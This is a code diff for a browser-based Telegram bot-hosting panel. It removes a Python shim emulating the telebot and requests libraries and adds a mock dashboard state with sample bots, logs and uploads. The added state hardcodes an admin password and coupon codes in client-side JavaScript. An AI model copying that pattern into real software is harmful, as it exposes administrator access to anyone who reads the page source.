-        self.message = MessageObj(d.get("message", {}), bot_ref) if "message" in d else None
-        self.inline_message_id = d.get("inline_message_id", None)
-        self.chat_instance = d.get("chat_instance", "")
-        self.data = d.get("data", "")
-        self.json = d
-
-class WebAppInfo:
-    def __init__(self, url, **kwargs):
-        self.url = url
-    def to_dict(self):
-        return {"url": self.url}
-
-class InlineKeyboardButton:
-    def __init__(self, text, url=None, callback_data=None, web_app=None, switch_inline_query=None, switch_inline_query_current_chat=None, **kwargs):
-        self.text = str(text)
-        self.url = url
-        self.callback_data = str(callback_data) if callback_data is not None else None
-        self.web_app = web_app
-        self.switch_inline_query = switch_inline_query
-        self.switch_inline_query_current_chat = switch_inline_query_current_chat
-
-    def to_dict(self):
-        d = {"text": self.text}
-        if self.url is not None:
-            d["url"] = str(self.url)
-        elif self.callback_data is not None:
-            d["callback_data"] = self.callback_data
-        elif self.web_app is not None:
-            d["web_app"] = _to_clean_dict(self.web_app) or {"url": str(self.web_app)}
-        elif self.switch_inline_query is not None:
-            d["switch_inline_query"] = str(self.switch_inline_query)
-        elif self.switch_inline_query_current_chat is not None:
-            d["switch_inline_query_current_chat"] = str(self.switch_inline_query_current_chat)
-        else:
-            d["callback_data"] = self.text[:60]
-        return d
-
-class InlineKeyboardMarkup:
-    def __init__(self, keyboard=None, row_width=3, **kwargs):
-        self.row_width = int(row_width or 3)
-        self.keyboard = []
-        if keyboard:
-            for r in keyboard:
-                if isinstance(r, list):
-                    self.keyboard.append([b.to_dict() if hasattr(b, "to_dict") else b for b in r])
-                else:
-                    self.keyboard.append([r.to_dict() if hasattr(r, "to_dict") else r])
-
-    def add(self, *args, row_width=None):
-        rw = int(row_width or self.row_width or 3)
-        btns = []
-        for a in args:
-            if a is None:
-                continue
-            if isinstance(a, list):
-                for x in a:
-                    btns.append(x.to_dict() if hasattr(x, "to_dict") else x)
-            else:
-                btns.append(a.to_dict() if hasattr(a, "to_dict") else a)
-        for i in range(0, len(btns), rw):
-            self.keyboard.append(btns[i:i+rw])
-        return self
-
-    def row(self, *args):
-        btns = [a.to_dict() if hasattr(a, "to_dict") else a for a in args if a is not None]
-        if btns:
-            self.keyboard.append(btns)
-        return self
-
-    def to_dict(self):
-        return {"inline_keyboard": self.keyboard}
-
-    def to_json(self):
-        return json.dumps(self.to_dict())
-
-class KeyboardButton:
-    def __init__(self, text, request_contact=False, request_location=False, web_app=None, **kwargs):
-        self.text = str(text)
-        self.request_contact = request_contact
-        self.request_location = request_location
-        self.web_app = web_app
-
-    def to_dict(self):
-        d = {"text": self.text}
-        if self.request_contact:
-            d["request_contact"] = True
-        if self.request_location:
-            d["request_location"] = True
-        if self.web_app:
-            d["web_app"] = _to_clean_dict(self.web_app)
-        return d
-
-class ReplyKeyboardMarkup:
-    def __init__(self, keyboard=None, resize_keyboard=True, one_time_keyboard=False, selective=False, row_width=3, placeholder=None, input_field_placeholder=None, **kwargs):
-        self.row_width = int(row_width or 3)
-        self.resize_keyboard = bool(resize_keyboard)
-        self.one_time_keyboard = bool(one_time_keyboard)
-        self.selective = bool(selective)
-        self.input_field_placeholder = input_field_placeholder or placeholder
-        self.keyboard = []
-        if keyboard:
-            for r in keyboard:
-                if isinstance(r, list):
-                    self.keyboard.append([b.to_dict() if hasattr(b, "to_dict") else ({"text": str(b)} if isinstance(b, str) else b) for b in r])
-                else:
-                    self.keyboard.append([r.to_dict() if hasattr(r, "to_dict") else {"text": str(r)}])
-
-    def add(self, *args, row_width=None):
-        rw = int(row_width or self.row_width or 3)
-        btns = []
-        for a in args:
-            if a is None:
-                continue
-            if isinstance(a, str):
-                btns.append({"text": a})
-            elif hasattr(a, "to_dict"):
-                btns.append(a.to_dict())
-            else:
-                btns.append(a)
-        for i in range(0, len(btns), rw):
-            self.keyboard.append(btns[i:i+rw])
-        return self
-
-    def row(self, *args):
-        btns = [({"text": a} if isinstance(a, str) else (a.to_dict() if hasattr(a, "to_dict") else a)) for a in args if a is not None]
-        if btns:
-            self.keyboard.append(btns)
-        return self
-
-    def to_dict(self):
-        d = {
-            "keyboard": self.keyboard,
-            "resize_keyboard": self.resize_keyboard,
-            "one_time_keyboard": self.one_time_keyboard,
-            "selective": self.selective
+    let state = {
+      activeTab: 'dashboard',
+      userPlan: 'pro',
+      adminAuthenticated: false,
+      adminKey: 'Ashif123',
+      wallet: 450,
+      trialUsed: false,
+      approvalRequired: true,
+      maintenanceMode: false,
+      coupons: {
+        SIMRAN50: 50,
+        ASHIF100: 100
+      },
+      bots: [
+        {
+          id: "a9f4c21e88b0192d",
+          name: "music_stream_bot",
+          kind: "python",
+          entry: "bot.py",
+          status: "running",
+          pid: 24819,
+          cpu: 4.2,
+          memMb: 118.4,
+          sizeKb: 420,
+          uptimeSec: 52410,
+          tunnelUrl: "https://music-stream-88a1.trycloudflare.com",
+          tunnelPort: 8080,
+          env: { BOT_TOKEN: "7182901122:AAF***************", LOG_LEVEL: "INFO" },
+          logs: [
+            "════════════════ START 2025-05-10T08:12:00Z ════════════════",
+            "━━━━━━━━━━━━━━━━ pip install (requirements.txt) ━━━━━━━━━━━━━━━━",
+            "[✓] requirements.txt done (rc=0)",
+            "[sandbox] Source files wiped from disk after 6.0s (bytecode active in RAM)",
+            "[telebot] Infinity polling started for @music_stream_bot",
+            "[info] Connected to voice node #2 — latency 18ms"
+          ]
+        },
+        {
+          id: "c73d104b92e145f0",
+          name: "crypto_alert_js",
+          kind: "node",
+          entry: "index.js",
+          status: "running",
+          pid: 25104,
+          cpu: 2.2,
+          memMb: 66.2,
+          sizeKb: 1280,
+          uptimeSec: 19320,
+          tunnelUrl: "",
+          tunnelPort: 3000,
+          env: { WEBHOOK_PORT: "3000", CURRENCY: "USDT" },
+          logs: [
+            "════════════════ START 2025-05-10T11:30:00Z ════════════════",
+            "[✓] node_modules cached, skipping npm install",
+            "[node] Express webhook listening on 127.0.0.1:3000",
+            "[ws] Subscribed to Binance BTCUSDT ticker stream"
+          ]
+        },
+        {
+          id: "e51b908c112a3301",
+          name: "group_moderator_py",
+          kind: "python",
+          entry: "main.py",
+          status: "stopped",
+          pid: null,
+          cpu: 0.0,
+          memMb: 0.0,
+          sizeKb: 215,
+          uptimeSec: 0,
+          tunnelUrl: "",
+          tunnelPort: 5000,
+          env: { ADMIN_CHAT_ID: "-1003715566556" },
+          logs: [
+            "════════════════ START 2025-05-09T19:00:00Z ════════════════",
+            "[✓] auto-install done (rc=0)",
+            "━━━━━━━━━━━━━━━━ process exited rc=0 (manual stop) ━━━━━━━━━━━━━━━━"
+          ]
         }
-        if self.input_field_placeholder:
-            d["input_field_placeholder"] = str(self.input_field_placeholder)
-        return d
-
-    def to_json(self):
-        return json.dumps(self.to_dict())
-
-class ReplyKeyboardRemove:
-    def __init__(self, selective=False, **kwargs):
-        self.selective = selective
-    def to_dict(self):
-        return {"remove_keyboard": True, "selective": self.selective}
-    def to_json(self):
-        return json.dumps(self.to_dict())
-
-class ForceReply:
-    def __init__(self, selective=False, input_field_placeholder=None, **kwargs):
-        self.selective = selective
-        self.input_field_placeholder = input_field_placeholder
-    def to_dict(self):
-        d = {"force_reply": True, "selective": self.selective}
-        if self.input_field_placeholder:
-            d["input_field_placeholder"] = self.input_field_placeholder
-        return d
-
-class TeleBotShim:
-    def __init__(self, token=None, parse_mode=None, **kwargs):
-        global _default_parse_mode, _global_bot
-        self.token = token
-        self.parse_mode = parse_mode
-        _default_parse_mode = parse_mode
-        _global_bot = self
-        if token and ":" in str(token) and "YOUR_BOT_TOKEN" not in str(token):
-            js.setDetectedToken(str(token))
-
-    def _call_api(self, method, payload):
-        res_str = js.syncTgCall(method, json.dumps(payload))
-        try:
-            data = json.loads(res_str)
-            if data.get("ok") and isinstance(data.get("result"), dict):
-                if "message_id" in data["result"]:
-                    return MessageObj(data["result"], self)
-                return DictObj(data["result"])
-            return data.get("result", True)
-        except Exception:
-            return MessageObj({"message_id": int(time.time()), "chat": {"id": payload.get("chat_id", 0)}}, self)
-
-    def get_file(self, file_id):
-        fid = str(file_id)
-        if fid in _py_file_info_cache:
-            return FileObj(_py_file_info_cache[fid])
-        res_str = js.syncGetFile(fid)
-        try:
-            data = json.loads(res_str)
-            if data.get("ok") and isinstance(data.get("result"), dict):
-                return FileObj(data["result"])
-        except Exception:
-            pass
-        return FileObj({"file_id": fid, "file_path": fid})
-
-    def download_file(self, file_path):
-        fp = str(file_path)
-        if fp in _py_file_bytes_cache:
-            return _py_file_bytes_cache[fp]
-        b64 = str(js.syncDownloadFileBase64(fp))
-        if b64:
-            raw = base64.b64decode(b64)
-            _py_file_bytes_cache[fp] = raw
-            return raw
-        return b""
-
-    def get_file_url(self, file_id):
-        f = self.get_file(file_id)
-        return f"https://api.telegram.org/file/bot{self.token}/{f.file_path}"
-
-    def pin_chat_message(self, chat_id, message_id, disable_notification=False, **kwargs):
-        return self._call_api("pinChatMessage", {
-            "chat_id": chat_id,
-            "message_id": message_id,
-            "disable_notification": bool(disable_notification)
-        })
-
-    def unpin_chat_message(self, chat_id, message_id=None, **kwargs):
-        p = {"chat_id": chat_id}
-        if message_id is not None:
-            p["message_id"] = message_id
-        return self._call_api("unpinChatMessage", p)
-
-    def unpin_all_chat_messages(self, chat_id, **kwargs):
-        return self._call_api("unpinAllChatMessages", {"chat_id": chat_id})
-
-    def message_handler(self, commands=None, regexp=None, func=None, content_types=None, chat_types=None, **kwargs):
-        def decorator(fn):
-            _handlers.append({
-                "type": "telebot",
-                "commands": commands,
-                "regexp": regexp,
-                "func": func,
-                "content_types": content_types,
-                "chat_types": chat_types,
-                "fn": fn,
-                "bot": self
-            })
-            return fn
-        return decorator
-
-    def callback_query_handler(self, func=None, **kwargs):
-        def decorator(fn):
-            _callback_handlers.append({"func": func, "fn": fn, "bot": self})
-            return fn
-        return decorator
-
-    def channel_post_handler(self, **kwargs):
-        return self.message_handler(**kwargs)
-
-    def edited_message_handler(self, **kwargs):
-        return self.message_handler(**kwargs)
-
-    def register_next_step_handler(self, message, callback, *args, **kwargs):
-        cid = message.chat.id if hasattr(message, "chat") else int(message)
-        _next_step_handlers[cid] = (callback, args, kwargs)
-
-    def register_next_step_handler_by_chat_id(self, chat_id, callback, *args, **kwargs):
-        _next_step_handlers[int(chat_id)] = (callback, args, kwargs)
-
-    def clear_step_handler_by_chat_id(self, chat_id):
-        _next_step_handlers.pop(int(chat_id), None)
-
-    def clear_step_handler(self, message):
-        if hasattr(message, "chat"):
-            _next_step_handlers.pop(message.chat.id, None)
-
-    def send_message(self, chat_id, text, parse_mode=None, reply_markup=None, reply_to_message_id=None, disable_web_page_preview=None, **kwargs):
-        pm = parse_mode if parse_mode is not None else self.parse_mode
-        payload = {"chat_id": chat_id, "text": str(text)}
-        if pm:
-            payload["parse_mode"] = pm
-        if reply_to_message_id:
-            payload["reply_to_message_id"] = reply_to_message_id
-        if disable_web_page_preview is not None:
-            payload["disable_web_page_preview"] = bool(disable_web_page_preview)
-        rm = _to_clean_dict(reply_markup)
-        if rm:
-            payload["reply_markup"] = rm
-        return self._call_api("sendMessage", payload)
-
-    def reply_to(self, message, text, **kwargs):
-        kwargs["reply_to_message_id"] = message.message_id
-        return self.send_message(message.chat.id, text, **kwargs)
-
-    def edit_message_text(self, text, chat_id=None, message_id=None, inline_message_id=None, parse_mode=None, reply_markup=None, **kwargs):
-        pm = parse_mode if parse_mode is not None else self.parse_mode
-        payload = {"text": str(text)}
-        if chat_id is not None:
-            payload["chat_id"] = chat_id
-        if message_id is not None:
-            payload["message_id"] = message_id
-        if inline_message_id is not None:
-            payload["inline_message_id"] = inline_message_id
-        if pm:
-            payload["parse_mode"] = pm
-        rm = _to_clean_dict(reply_markup)
-        if rm:
-            payload["reply_markup"] = rm
-        return self._call_api("editMessageText", payload)
-
-    def edit_message_caption(self, caption, chat_id=None, message_id=None, parse_mode=None, reply_markup=None, **kwargs):
-        pm = parse_mode if parse_mode is not None else self.parse_mode
-        payload = {"caption": str(caption or "")}
-        if chat_id is not None:
-            payload["chat_id"] = chat_id
-        if message_id is not None:
-            payload["message_id"] = message_id
-        if pm:
-            payload["parse_mode"] = pm
-        rm = _to_clean_dict(reply_markup)
-        if rm:
-            payload["reply_markup"] = rm
-        return self._call_api("editMessageCaption", payload)
-
-    def edit_message_reply_markup(self, chat_id=None, message_id=None, inline_message_id=None, reply_markup=None, **kwargs):
-        payload = {}
-        if chat_id is not None:
-            payload["chat_id"] = chat_id
-        if message_id is not None:
-            payload["message_id"] = message_id
-        rm = _to_clean_dict(reply_markup)
-        if rm:
-            payload["reply_markup"] = rm
-        return self._call_api("editMessageReplyMarkup", payload)
-
-    def delete_message(self, chat_id, message_id, **kwargs):
-        return self._call_api("deleteMessage", {"chat_id": chat_id, "message_id": message_id})
-
-    def answer_callback_query(self, callback_query_id, text=None, show_alert=False, url=None, cache_time=0, **kwargs):
-        payload = {"callback_query_id": callback_query_id, "show_alert": bool(show_alert)}
-        if text is not None:
-            payload["text"] = str(text)
-        if url is not None:
-            payload["url"] = str(url)
-        if cache_time:
-            payload["cache_time"] = int(cache_time)
-        return self._call_api("answerCallbackQuery", payload)
-
-    def _send_media_generic(self, field_type, chat_id, data, caption=None, reply_markup=None, parse_mode=None, reply_to_message_id=None, visible_file_name=None, **kwargs):
-        pm = parse_mode if parse_mode is not None else self.parse_mode
-        opts = {"chat_id": chat_id}
-        if caption is not None:
-            opts["caption"] = str(caption)
-        if pm:
-            opts["parse_mode"] = pm
-        if reply_to_message_id:
-            opts["reply_to_message_id"] = reply_to_message_id
-        rm = _to_clean_dict(reply_markup)
-        if rm:
-            opts["reply_markup"] = rm
-
-        if isinstance(data, tuple) and len(data) >= 2:
-            visible_file_name = visible_file_name or str(data[0])
-            data = data[1]
-
-        # Check if data is a Telegram file_id or HTTP URL
-        is_multiline = isinstance(data, str) and (chr(10) in data or chr(13) in data)
-        if isinstance(data, str) and not os.path.exists(data) and len(data) < 250 and not is_multiline:
-            opts[field_type] = data
-            method_map = {"document": "sendDocument", "photo": "sendPhoto", "video": "sendVideo", "audio": "sendAudio", "voice": "sendVoice"}
-            return self._call_api(method_map.get(field_type, "sendDocument"), opts)
-
-        raw_bytes = b""
-        ext = "txt" if field_type == "document" else "jpg"
-        fname = visible_file_name or getattr(data, "name", None) or f"Decrypted_Config.{ext}"
-        if isinstance(data, str) and os.path.exists(data):
-            fname = visible_file_name or os.path.basename(data)
-            with open(data, "rb") as f:
-                raw_bytes = f.read()
-        elif hasattr(data, "getvalue"):
-            val = data.getvalue()
-            raw_bytes = val.encode("utf-8") if isinstance(val, str) else val
-        elif hasattr(data, "read"):
-            try:
-                data.seek(0)
-            except Exception:
-                pass
-            val = data.read()
-            raw_bytes = val.encode("utf-8") if isinstance(val, str) else val
-        elif isinstance(data, (bytes, bytearray)):
-            raw_bytes = bytes(data)
-        else:
-            raw_bytes = str(data).encode("utf-8")
-
-        b64_str = base64.b64encode(raw_bytes).decode("ascii")
-        js.sendTgMultipartBase64(field_type, str(fname), b64_str, json.dumps(opts))
-        return MessageObj({"message_id": int(time.time()), "chat": {"id": chat_id}}, self)
-
-    def send_document(self, chat_id, document, reply_to_message_id=None, caption=None, reply_markup=None, parse_mode=None, visible_file_name=None, **kwargs):
-        return self._send_media_generic("document", chat_id, document, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id, visible_file_name=visible_file_name, **kwargs)
-
-    def send_photo(self, chat_id, photo, caption=None, reply_to_message_id=None, reply_markup=None, parse_mode=None, **kwargs):
-        return self._send_media_generic("photo", chat_id, photo, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id, **kwargs)
-
-    def send_video(self, chat_id, video, caption=None, reply_to_message_id=None, reply_markup=None, parse_mode=None, **kwargs):
-        return self._send_media_generic("video", chat_id, video, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id, **kwargs)
-
-    def send_audio(self, chat_id, audio, caption=None, reply_to_message_id=None, reply_markup=None, parse_mode=None, **kwargs):
-        return self._send_media_generic("audio", chat_id, audio, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id, **kwargs)
-
-    def send_voice(self, chat_id, voice, caption=None, reply_to_message_id=None, reply_markup=None, parse_mode=None, **kwargs):
-        return self._send_media_generic("voice", chat_id, voice, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id, **kwargs)
-
-    def send_chat_action(self, chat_id, action, **kwargs):
-        return self._call_api("sendChatAction", {"chat_id": chat_id, "action": action})
-
-    def forward_message(self, chat_id, from_chat_id, message_id, **kwargs):
-        return self._call_api("forwardMessage", {"chat_id": chat_id, "from_chat_id": from_chat_id, "message_id": message_id})
-
-    def copy_message(self, chat_id, from_chat_id, message_id, caption=None, reply_markup=None, parse_mode=None, **kwargs):
-        pm = parse_mode if parse_mode is not None else self.parse_mode
-        p = {"chat_id": chat_id, "from_chat_id": from_chat_id, "message_id": message_id}
-        if caption is not None:
-            p["caption"] = caption
-        if pm:
-            p["parse_mode"] = pm
-        rm = _to_clean_dict(reply_markup)
-        if rm:
-            p["reply_markup"] = rm
-        return self._call_api("copyMessage", p)
-
-    def get_me(self):
-        res_str = js.syncTgCall("getMe", "{}")
-        d = json.loads(res_str)
-        return UserObj(d.get("result", {}))
-
-    def get_chat(self, chat_id):
-        res_str = js.syncTgCall("getChat", json.dumps({"chat_id": chat_id}))
-        d = json.loads(res_str)
-        return ChatObj(d.get("result", {"id": chat_id}))
-
-    def get_chat_member(self, chat_id, user_id):
-        res_str = js.syncTgCall("getChatMember", json.dumps({"chat_id": chat_id, "user_id": user_id}))
-        d = json.loads(res_str)
-        res = d.get("result", {"status": "member"})
-        return DictObj(res)
-
-    def infinity_polling(self, *args, **kwargs):
-        print("✅ TeleBot infinity_polling() active on DarkX Engine.")
-
-    def polling(self, *args, **kwargs):
-        print("✅ TeleBot polling() active on DarkX Engine.")
-
-    def __getattr__(self, name):
-        def dynamic_method(*args, **kwargs):
-            parts = name.split("_")
-            camel = parts[0] + "".join(p.capitalize() for p in parts[1:])
-            if args and "chat_id" not in kwargs:
-                kwargs["chat_id"] = args[0]
-            return self._call_api(camel, kwargs)
-        return dynamic_method
-
-_global_bot = TeleBotShim()
-
-telebot_mod = types.ModuleType("telebot")
-telebot_mod.TeleBot = TeleBotShim
-types_mod = types.ModuleType("telebot.types")
-types_mod.InlineKeyboardMarkup = InlineKeyboardMarkup
-types_mod.InlineKeyboardButton = InlineKeyboardButton
-types_mod.ReplyKeyboardMarkup = ReplyKeyboardMarkup
-types_mod.KeyboardButton = KeyboardButton
-types_mod.ReplyKeyboardRemove = ReplyKeyboardRemove
-types_mod.ForceReply = ForceReply
-types_mod.WebAppInfo = WebAppInfo
-types_mod.Message = MessageObj
-types_mod.CallbackQuery = CallbackQueryObj
-types_mod.User = UserObj
-types_mod.Chat = ChatObj
-types_mod.Document = DocumentObj
-types_mod.File = FileObj
-telebot_mod.types = types_mod
-telebot_mod.util = types.SimpleNamespace(
-    smart_split=lambda text, chars_per_string=4096: [text[i:i+chars_per_string] for i in range(0, len(text), chars_per_string)],
-    escape=lambda s: str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-)
-telebot_mod.apihelper = types.SimpleNamespace(ApiTelegramException=Exception, ApiException=Exception)
-sys.modules["telebot"] = telebot_mod
-sys.modules["telebot.types"] = types_mod
-sys.modules["telebot.util"] = telebot_mod.util
-sys.modules["telebot.apihelper"] = telebot_mod.apihelper
-
-req_mod = types.ModuleType("requests")
-class ReqResponse:
-    def __init__(self, status_code, text):
-        self.status_code = status_code
-        self.text = text
-        self.content = text.encode("utf-8", errors="ignore")
-        self.ok = (200 <= status_code < 400)
-    def json(self):
-        return json.loads(self.text)
-
-def _req_call(method, url, headers=None, data=None, json_body=None, params=None, **kwargs):
-    if params and isinstance(params, dict):
-        import urllib.parse
-        qs = urllib.parse.urlencode(params)
-        url = url + ("&" if "?" in url else "?") + qs
-    body_str = None
-    hdrs = dict(headers or {})
-    if json_body is not None:
-        body_str = json.dumps(json_body)
-        hdrs["Content-Type"] = "application/json"
-    elif isinstance(data, dict):
-        import urllib.parse
-        body_str = urllib.parse.urlencode(data)
-        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
-    elif data is not None:
-        body_str = str(data)
-    raw = json.loads(js.syncHttpFetch(method, str(url), json.dumps(hdrs), body_str or ""))
-    return ReqResponse(raw.get("status", 200), raw.get("text", ""))
-
-req_mod.get = lambda url, **kw: _req_call("GET", url, **kw)
-req_mod.post = lambda url, **kw: _req_call("POST", url, data=kw.get("data"), json_body=kw.get("json"), headers=kw.get("headers"), params=kw.get("params"))
-req_mod.Session = lambda: req_mod
-sys.modules["requests"] = req_mod
-
-async def _dispatch_telegram_update(raw_update_json):
-    upd = json.loads(raw_update_json)
-
-    if "callback_query" in upd:
-        call = CallbackQueryObj(upd["callback_query"], _global_bot)
-        for ch in _callback_handlers:
-            matched = True
-            if ch["func"] is not None:
-                try:
-                    matched = bool(ch["func"](call))
-                except Exception:
-                    matched = False
-            if matched:
-                try:
-                    res = ch["fn"](call)
-                    if hasattr(res, "__await__"):
-                        await res
-                except Exception:
-                    print("⚠️ Callback Exception:\n" + traceback.format_exc())
-                sys.stdout.flush()
-                break
-        return
-
-    msg_data = upd.get("message") or upd.get("edited_message") or upd.get("channel_post")
-    if not msg_data:
-        return
-
-    msg = MessageObj(msg_data, _global_bot)
-    cid = msg.chat.id
-
-    if cid in _next_step_handlers:
-        cb, args, kwargs = _next_step_handlers.pop(cid)
-        try:
-            res = cb(msg, *args, **kwargs)
-            if hasattr(res, "__await__"):
-                await res
-        except Exception:
-            print("⚠️ Next Step Exception:\n" + traceback.format_exc())
-        sys.stdout.flush()
-        return
-
-    text = (msg.text or msg.caption or "").strip()
-
-    for h in _handlers:
-        if h["type"] == "telebot":
-            ctypes = h.get("content_types")
-            if ctypes:
-                if msg.content_type not in ctypes and "any" not in ctypes:
-                    continue
-            else:
-                if msg.content_type != "text" and h.get("commands"):
-                    continue
-
-            cmds = h.get("commands")
-            if cmds:
-                if not text.startswith("/"):
-                    continue
-                first_word = text.split()[0][1:].split("@")[0].lower()
-                if first_word not in [c.lower().lstrip("/") for c in cmds]:
-                    continue
-
-            rx = h.get("regexp")
-            if rx:
-                if not re.search(rx, text):
-                    continue
-
-            fn_filter = h.get("func")
-            if fn_filter is not None:
-                try:
-                    if not fn_filter(msg):
-                        continue
-                except Exception:
-                    continue
-
-            try:
-                res = h["fn"](msg)
-                if hasattr(res, "__await__"):
-                    await res
-            except Exception:
-                print(f"⚠️ Handler Error in {h['fn'].__name__}:\n" + traceback.format_exc())
-            sys.stdout.flush()
-            break
-</script>
-
-<script>
-// =========================================================
-// 1. PERMANENT DEVICE DATABASE (IndexedDB + LocalStorage)
-// =========================================================
-const DB_NAME = "DarkXBotHostingDeviceDB_v3";
-const DB_STORE = "bot_workspace";
-const STATS_KEY = "darkx_bot_uptime_stats_v3";
-
-let dbInstance = null;
-let pyodideInstance = null;
-let pyodideLoadingPromise = null;
-let isBotRunning = false;
-let pollOffset = 0;
-let activeToken = "";
-let activeLang = "python";
-let wakeLockObj = null;
-let audioKeepAliveCtx = null;
-let workerHeartbeat = null;
-let sessionStartTimestamp = 0;
-
-const virtualFiles = new Map();
-const tgFileBytesCache = new Map();
-const tgFileIdMap = new Map();
-
-let botStats = JSON.parse(localStorage.getItem(STATS_KEY) || "null") || {
-    firstHostedAt: Date.now(),
-    totalRunSeconds: 0,
-    totalOffSeconds: 0,
-    lastTickAt: Date.now(),
-    wasRunning: false,
-    processedMessages: 0,
-    botUsername: "Not Connected",
-    botId: "N/A"
-};
-
-(function reconcileOfflineGap() {
-    const now = Date.now();
-    const gapSec = Math.max(0, Math.floor((now - (botStats.lastTickAt || now)) / 1000));
-    if (gapSec > 2) {
-        botStats.totalOffSeconds = (botStats.totalOffSeconds || 0) + gapSec;
-    }
-    botStats.lastTickAt = now;
-    localStorage.setItem(STATS_KEY, JSON.stringify(botStats));
-})();
-
-function formatDaysHoursMins(totalSecs) {
-    totalSecs = Math.max(0, Math.floor(totalSecs || 0));
-    const days = Math.floor(totalSecs / 86400);
-    const hours = Math.floor((totalSecs % 86400) / 3600);
-    const mins = Math.floor((totalSecs % 3600) / 60);
-    const secs = totalSecs % 60;
-    return `${days} Din, ${hours}h ${mins}m ${secs}s`;
-}
-
-function formatHMS(totalSecs) {
-    totalSecs = Math.max(0, Math.floor(totalSecs || 0));
-    const h = String(Math.floor(totalSecs / 3600)).padStart(2, "0");
-    const m = String(Math.floor((totalSecs % 3600) / 60)).padStart(2, "0");
-    const s = String(totalSecs % 60).padStart(2, "0");
-    return `${h}:${m}:${s}`;
-}
-
-setInterval(() => {
-    const now = Date.now();
-    const delta = Math.max(1, Math.min(5, Math.round((now - (botStats.lastTickAt || now)) / 1000)));
-    botStats.lastTickAt = now;
-
-    if (isBotRunning) {
-        botStats.totalRunSeconds = (botStats.totalRunSeconds || 0) + delta;
-    } else {
-        botStats.totalOffSeconds = (botStats.totalOffSeconds || 0) + delta;
-    }
-
-    localStorage.setItem(STATS_KEY, JSON.stringify(botStats));
-
-    document.getElementById("totalRunDisplay").innerText = formatDaysHoursMins(botStats.totalRunSeconds);
-    document.getElementById("totalOffDisplay").innerText = formatDaysHoursMins(botStats.totalOffSeconds);
-    document.getElementById("firstHostedDisplay").innerText = "First Hosted: " + new Date(botStats.firstHostedAt).toLocaleDateString();
-    document.getElementById("lastSeenDisplay").innerText = isBotRunning ? "Status: Currently Running 🟢" : "Status: Currently Paused 🔴";
-    document.getElementById("msgCountLabel").innerText = botStats.processedMessages || 0;
-
-    if (isBotRunning && sessionStartTimestamp > 0) {
-        const sesSecs = Math.floor((now - sessionStartTimestamp) / 1000);
-        document.getElementById("currentSessionDisplay").innerText = formatHMS(sesSecs);
-    } else {
-        document.getElementById("currentSessionDisplay").innerText = "00:00:00";
-    }
-}, 1000);
-
-function resetUptimeStats() {
-    botStats.firstHostedAt = Date.now();
-    botStats.totalRunSeconds = 0;
-    botStats.totalOffSeconds = 0;
-    botStats.lastTickAt = Date.now();
-    botStats.processedMessages = 0;
-    sessionStartTimestamp = isBotRunning ? Date.now() : 0;
-    localStorage.setItem(STATS_KEY, JSON.stringify(botStats));
-    logTerm("🔄 Uptime & Offline counters reset to 0.");
-}
-
-function openDeviceIndexedDB() {
-    return new Promise((resolve) => {
-        try {
-            const req = indexedDB.open(DB_NAME, 1);
-            req.onupgradeneeded = (e) => {
-                const db = e.target.result;
-                if (!db.objectStoreNames.contains(DB_STORE)) {
-                    db.createObjectStore(DB_STORE);
-                }
-            };
-            req.onsuccess = (e) => {
-                dbInstance = e.target.result;
-                resolve(dbInstance);
-            };
-            req.onerror = () => resolve(null);
-        } catch (e) {
-            resolve(null);
+      ],
+      pendingUploads: [
+        {
+          id: "f9012bc3411a",
+          user: "@rahul_dev (701928311)",
+          name: "auto_reply_helper",
+          file: "auto_reply.zip",
+          size: "148 KB",
+          verdict: "SAFE",
+          risk: 5
+        },
+        {
+          id: "d8120ae9912c",
+          user: "@anon_coder (691823104)",
+          name: "server_dumper_v1",
+          file: "dumper.py",
+          size: "14 KB",
+          verdict: "SUSPICIOUS",
+          risk: 62
         }
-    });
-}
+      ],
+      auditLogs: [
+        "[12:41:09] uid=8253072984 action=panel_boot brand=Simran Hosting RBOT v2.1",
+        "[12:38:20] uid=8253072984 action=gh_backup size=2.14MB branch=main",
+        "[11:15:44] uid=8253072984 action=pay_approve pid=89A1C2F0 plan=pro"
+      ]
+    };
 
-async function dbSaveKey(key, val) {
-    try {
-        localStorage.setItem("darkx_db_" + key, typeof val === "string" ? val : JSON.stringify(val));
-    } catch (e) {}
-    if (!dbInstance) await openDeviceIndexedDB();
-    if (!dbInstance) return;
-    return new Promise((resolve) => {
-        try {
-            const tx = dbInstance.transaction(DB_STORE, "readwrite");
-            tx.objectStore(DB_STORE).put(val, key);
-            tx.oncomplete = () => resolve(true);
-            tx.onerror = () => resolve(false);
-        } catch (e) { resolve(false); }
-    });
-}
-
-async function dbLoadKey(key) {
-    if (!dbInstance) await openDeviceIndexedDB();
-    if (dbInstance) {
-        const val = await new Promise((resolve) => {
-            try {
-                const tx = dbInstance.transaction(DB_STORE, "readonly");
-                const req = tx.objectStore(DB_STORE).get(key);
-                req.onsuccess = () => resolve(req.result);
-                req.onerror = () => resolve(undefined);
-            } catch (e) { resolve(undefined); }
-        });
-        if (val !== undefined) return val;
-    }
-    const ls = localStorage.getItem("darkx_db_" + key);
-    if (ls !== null) {
-        try { return JSON.parse(ls); } catch (e) { return ls; }
-    }
-    return undefined;
-}
-
-async function saveAllToDeviceDB(showLog = false) {
-    const code = document.getElementById("codeEditor").value;
-    const reqs = document.getElementById("reqEditor").value;
-    const lang = document.getElementById("langSelect").value;
-    const tok = document.getElementById("tokenInput").value.trim();
-    const autoRes = document.getElementById("autoResumeToggle").checked;
-
-    const filesObj = {};
-    virtualFiles.forEach((b64, name) => { filesObj[name] = b64; });
-
-    await dbSaveKey("code", code);
-    await dbSaveKey("reqs", reqs);
-    await dbSaveKey("lang", lang);
-    await dbSaveKey("token", tok);
-    await dbSaveKey("autoResume", autoRes);
-    await dbSaveKey("files", filesObj);
-
-    const dbBadge = document.getElementById("dbStateDisplay");
-    dbBadge.innerText = "● Saved (" + new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ")";
-    if (showLog) logTerm("💾 Code, Requirements, Token, and Files saved to Device Database.");
-}
-
-async function clearDeviceDB() {
-    if (!confirm("Clear saved bot code and files from device database?")) return;
-    localStorage.clear();
